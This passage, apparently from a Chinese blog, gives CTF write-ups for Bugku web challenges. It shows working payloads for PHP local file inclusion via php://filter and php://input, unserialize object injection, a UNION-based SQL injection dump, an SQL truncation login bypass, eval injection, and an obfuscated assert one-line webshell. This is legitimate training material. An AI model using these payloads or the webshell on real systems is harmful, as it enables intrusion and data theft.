base64加密后的<br>得到flag：&lt;?php $key=’KEY{key_keys}’; ?&gt;</p><h2 id="flag在index里面"><a href="#flag在index里面" class="headerlink" title="flag在index里面"></a><a href="12">flag在index里面</a></h2><p>点一点链接，url变成了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8005/post/index.php?file=show.php</span><br></pre></td></tr></table></figure></p><p>这样应该就是php，包含了我们get输入的file参数。<br>问题是他说flag在index.php，我怎么样都读不出。<br>后来想到文件包含里面可以用PHP的filter来读php文件(不需要allow_url_include)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=./index.php</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/06/17/5b2610e185b80.png" alt="Alt text"><br>base64解密后：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-ctf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!$_GET[file])&#123;<span class="keyword">echo</span> <span class="string">'&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;'</span>;&#125;</span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag:flag&#123;edulcni_elif_lacol_si_siht&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>flag{edulcni_elif_lacol_si_siht}</p><h2 id="nerver-give-up"><a href="#nerver-give-up" class="headerlink" title="nerver give up"></a><a href="13">nerver give up</a></h2><p>看源码：1p.html<br>被跳转了，View-source:  看源码 </p><p> 得到：<br><figure class="highlight htmlbars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;HEAD&gt;</span><br><span class="line">&lt;SCRIPT LANGUAGE="Javascript"&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">var Words ="%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E" </span><br><span class="line">function OutWord()</span><br><span class="line">&#123;</span><br><span class="line">var NewWords;</span><br><span class="line">NewWords = unescape(Words);</span><br><span class="line">document.write(NewWords);</span><br><span class="line">&#125; </span><br><span class="line">OutWord();</span><br><span class="line">// --&gt;</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/HEAD&gt;</span><br><span class="line">&lt;BODY&gt;</span><br><span class="line">&lt;/BODY&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure></p><p>解码后：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Words =<span class="string">"&lt;script&gt;window.location.href='http://www.bugku.com';&lt;/script&gt; "</span>;</span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">header(<span class="string">'Location: hello.php?id=1'</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))  <span class="comment">//不区分大小写的，返回第一个.的位置 这里不能有“.”</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'no no no no no no no'</span>;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);  <span class="comment">//加上@屏蔽错误信息</span></span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"bugku is a nice plateform!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">require</span>(<span class="string">"f4l2a3g.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"never never never give up !!!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">OutWord</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> NewWords;</span><br><span class="line">NewWords = unescape(Words);</span><br><span class="line">document.write(NewWords);</span><br><span class="line">&#125; </span><br><span class="line">OutWord();</span><br><span class="line"><span class="comment">// --&gt;</span></span><br></pre></td></tr></table></figure></p><p>关键的一段需要绕过的地方：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($data==<span class="string">"bugku is a nice plateform!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br></pre></td></tr></table></figure></p><p>eregi有%00截断的漏洞，$data参数在前面配合file_get_contents()函数，我们可以php://input传入：<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello.php?id=%00&amp;a=php://input&amp;b=%0012345</span><br><span class="line">post_data：bugku is a nice plateform!</span><br></pre></td></tr></table></figure></p><p>flag{tHis_iS_THe_fLaG} </p><h2 id="SQL约束攻击"><a href="#SQL约束攻击" class="headerlink" title="SQL约束攻击"></a><a href="13">SQL约束攻击</a></h2><blockquote><p>参考： <a href="http://www.freebuf.com/articles/web/124537.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/124537.html</a><br>SQL约束攻击：攻击者使用任意身份的登录的漏洞</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Checking whether a user with the same username exists</span></span><br><span class="line">$username = mysql_real_escape_string($_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = mysql_real_escape_string($_GET[<span class="string">'password'</span>]);</span><br><span class="line">$query = <span class="string">"SELECT *</span></span><br><span class="line"><span class="string">          FROM users</span></span><br><span class="line"><span class="string">          WHERE username='$username'"</span>;</span><br><span class="line">$res = mysql_query($query, $database);</span><br><span class="line"><span class="keyword">if</span>($res) &#123;</span><br><span class="line">  <span class="keyword">if</span>(mysql_num_rows($res) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// User exists, exit gracefully</span></span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// If not, only then insert a new entry</span></span><br><span class="line">    $query = <span class="string">"INSERT INTO users(username, password)</span></span><br><span class="line"><span class="string">              VALUES ('$username','$password')"</span>;</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>验证登录信息的页面：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$username = mysql_real_escape_string($_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = mysql_real_escape_string($_GET[<span class="string">'password'</span>]);</span><br><span class="line">$query = <span class="string">"SELECT username FROM users</span></span><br><span class="line"><span class="string">          WHERE username='$username'</span></span><br><span class="line"><span class="string">              AND password='$password' "</span>;</span><br><span class="line">$res = mysql_query($query, $database);</span><br><span class="line"><span class="keyword">if</span>($res) &#123;</span><br><span class="line">  <span class="keyword">if</span>(mysql_num_rows($res) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">      $row = mysql_fetch_assoc($res);</span><br><span class="line">      <span class="keyword">return</span> $row[<span class="string">'username'</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">Null</span>;</span><br></pre></td></tr></table></figure></p><p><strong>原理</strong>：<br>这里这行select语句：SELECT <em> FROM users WHERE username=’vampire     ‘;<br>和这句的效果是一样的：SELECT </em> FROM users WHERE username=’vampire’;<br>SQL执行字符串处理时，字符串末尾的空格会被去除。</p><p>在insert查询中，SQL会根据varchar(n)来限制字符串的最大长度，也就是说大于n的话就只取前n个字符。</p><p>下面如果我们用”admin         1”和随便一个密码 来注册一个号子，对于注册界面的select语句，它并没有查到数据库中有该用户，所以成功绕过，运行到后面的insert语句的时候，只会插入前n个字符，所以当空格足够多的时候，相当于插入了一个”admin   “<br>接下来到登录的页面，用admin和之前随便输入的密码进行登录的时候，搜索该用户名SELECT查询都将返回第一个数据记录。这样的话就可以使用原始用户身份登录。</p><p> <strong>防御办法</strong>：将名字那列加上UNIQUE约束，使之不能插入另一条记录，检测到两个相同的字符串，并insert查询失败。</p><p>flag: SKCTF{4Dm1n_HaV3_GreAt_p0w3R} </p><h2 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a><a href="14">Web8</a></h2><blockquote><p>题示信息：txt？？？？<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line"><span class="keyword">if</span> ($ac === $f)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span> .<span class="string">" $flag&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p></blockquote><p>extract($_GET)注册变量<br>绕过办法：ac=aa&amp;f=php://input<br>data=aa</p><p>后来还知道 访问flag.txt后出现flags (个人觉得，这种方法纯属取巧，很难知道目录下有flag.txt文件的）<br><a href="http://120.24.86.145:8002/web8/?ac=flags&amp;fn=flag.txt" target="_blank" rel="noopener">http://120.24.86.145:8002/web8/?ac=flags&amp;fn=flag.txt</a></p><p>其实不难发现，上面几个题都出现了file_get_contents函数，而且都和php伪协议有关，这意味着，以后碰到这个函数可以多往这个方面想想</p><h2 id="welcome-to-bugku"><a href="#welcome-to-bugku" class="headerlink" title="welcome to bugku"></a><a href="15">welcome to bugku</a></h2><p>查看源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">you are not the number of bugku !   </span><br><span class="line">  </span><br><span class="line">&lt;!--  </span><br><span class="line">$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure></p><p>既然要用伪协议传入welcome to the bugkuctf，那么就可以用php://filter/convert.base64-encode/resource=hint.php读出hint.php（直接读是读不出来的）</p><p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgIA0KICANCmNsYXNzIEZsYWd7Ly9mbGFnLnBocCAgDQogICAgcHVibGljICRmaWxlOyAgDQogICAgcHVibGljIGZ1bmN0aW9uIF9fdG9zdHJpbmcoKXsgIA0KICAgICAgICBpZihpc3NldCgkdGhpcy0+ZmlsZSkpeyAgDQogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgDQoJCQllY2hvICI8YnI+IjsNCgkJcmV0dXJuICgiZ29vZCIpOw0KICAgICAgICB9ICANCiAgICB9ICANCn0gIA0KPz4gIA==</span><br></pre></td></tr></table></figure></p><p>base64解码后：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>__tostring：字符操作时触发()。<br>用这种伪协议读文件的方法的时候：一定要想着多看几个文件,像index.php(robots.txt) 不能漏<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//120.24.86.145:8006/test1/txt=php://input&amp;file=php://filter/convert.base64-encode/resource=index.php&amp;password=123</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$txt = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello friend!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"不能现在就给你flag哦"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        <span class="keyword">echo</span> $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not the number of bugku ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>echo $password 会触发__tostring<br>所以file参数写包含hint.php，txt还是之前的伪协议不变，password就<br>用以下脚本传入flag.php，序列化的数据<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">'Flag.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Flag();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>password = O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}<br> payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8006/test1/?txt=php://input&amp;file=php://filter/convert.base64-encode/resource=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br><span class="line">data：welcome to the bugkuctf</span><br></pre></td></tr></table></figure></p><p>拿到flag<br>flag{php_is_the_best_language}</p><h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a><a href="http://120.24.86.145:8003/" target="_blank" rel="noopener">本地包含</a></h2><p>题目源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">    $a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line">    <span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>使用?hello=file(‘flag.php’)<br>或者?hello=show_source(‘flag.php’) 等可以读取源码的函数<br>或者构造var_dump($a) 闭合</p><h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a><a href="17">成绩单</a></h2><p>过滤了–+，<br>已判断字段4个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-2&apos; union select 1,2,3,database() #</span><br></pre></td></tr></table></figure></p><p>查出数据库：skctf_flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-2&apos; union select 1,2,3,table_name from information_schema.tables where table_schema=&apos;skctf_flag&apos;  #</span><br></pre></td></tr></table></figure></p><p>查出表：fl4g<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-2&apos; union select 1,2,3,column_name from information_schema.columns where table_name=&apos;fl4g&apos;  #</span><br></pre></td></tr></table></figure></p><p>查出字段skctf_flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-2&apos; union select 1,2,skctf_flag,4 from skctf_flag.fl4g #</span><br></pre></td></tr></table></figure></p><p>查出flag：BUGKU{Sql_INJECT0N_4813drd8hz4}</p><h2 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a><a href="18">各种绕过</a></h2><p>源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$flag = <span class="string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'uname'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'uname'</span>] == $_POST[<span class="string">'passwd'</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'passwd can not be uname.'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'uname'</span>]) === sha1($_POST[<span class="string">'passwd'</span>])&amp;($_GET[<span class="string">'id'</span>]==<span class="string">'margin'</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'sorry!'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>两个不相等的值，但sha1相等：一样用数组绕过即可获得flag</p><h2 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a><a href="19">过狗一句话</a></h2><p>题示信息：送给大家一个过狗一句话<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $poc=<span class="string">"a#s#s#e#r#t"</span>; $poc_1=explode(<span class="string">"#"</span>,$poc); $poc_2=$poc_1[<span class="number">0</span>].$poc_1[<span class="number">1</span>].$poc_1[<span class="number">2</span>].$poc_1[<span class="number">3</span>].$poc_1[<span class="number">4</span>].$poc_1[<span class="number">5</span>]; $poc_2($_GET[<span class="string">'s'</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 